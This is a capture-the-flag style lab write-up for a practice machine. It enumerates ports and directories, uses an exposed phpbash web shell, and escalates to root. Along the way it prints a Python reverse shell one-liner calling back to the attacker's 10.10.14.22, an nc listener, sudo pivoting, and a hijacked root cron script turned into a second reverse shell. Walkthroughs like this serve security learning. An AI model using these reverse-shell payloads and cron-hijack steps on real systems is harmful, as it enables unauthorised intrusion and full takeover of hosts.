#cronjob #cronjobs #UID
Let's do a quick nmap

```
nmap 10.129.3.6                  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 02:37 -0400
Nmap scan report for 10.129.3.6
Host is up (0.023s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.16 seconds

```

Let's find some hidden directories : 

```
gobuster dir -u http://10.129.3.6/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt       
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.3.6/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 294]
.htpasswd            (Status: 403) [Size: 294]
.hta                 (Status: 403) [Size: 289]
css                  (Status: 301) [Size: 306] [--> http://10.129.3.6/css/]
dev                  (Status: 301) [Size: 306] [-->http://10.129.3.6/dev/](Status: 403) [Size: 298]
uploads              (Status: 301) [Size: 310] [--> http://10.129.3.6/uploads/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===========
```


###### After going of the Webpage I discovered these two pages : 

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311025104.png)


###### After clicking on phpbash.min.php, I have access to a terminal like this : 

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311025130.png)


###### Then I need to find user.txt : 

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311024849.png)


## Get the Root Flag : 

##### Do a reverse shell to be more confortable : 

Terminal 1 :

```
nc -lnvp 4444
```

Terminal : 2 

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311025619.png)

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```


#### TTY : 

- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    
- Fais **Ctrl+Z** (pour mettre le shell en arrière-plan).
    
- Tape `stty raw -echo; fg` puis appuie sur **Entrée** deux fois.
    
- Tape `export TERM=xterm`


### Then

To verify my privileges, 

```
sudo -l
```



![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311035144.png)

I can go into scriptmanager without being root with this command : 

```
sudo -u scriptmanager /bin/bash
```


In the /,  we see there is a folder “scripts” and there are two files in it :

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034854.png)


test.txt is owned by root and we can modify the test.py. Let’s cat the content of test.py :

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034906.png)


###### Which means this python script (which is owned by scriptmanager) opens test.txt and wrtites “testing 123!” on it.

I used the process monitoring tool pspy64 to check if any cron jobs executed by the root user were interacting with the scripts folder. 
Fortunately, I discovered that the root user accesses this folder every minute and executes all .py files inside it with root privileges. You can verify this by the UID=0 shown in the screenshot, which is assigned to the root user. 
This explains why the scriptmanager user is able to modify a file owned by root.

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034919.png)


##### Then modify the test.py to reverse shell with root privileges :

```
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.22", 4445)) 
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```



##### Then wait a little and BOOM !

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034227.png)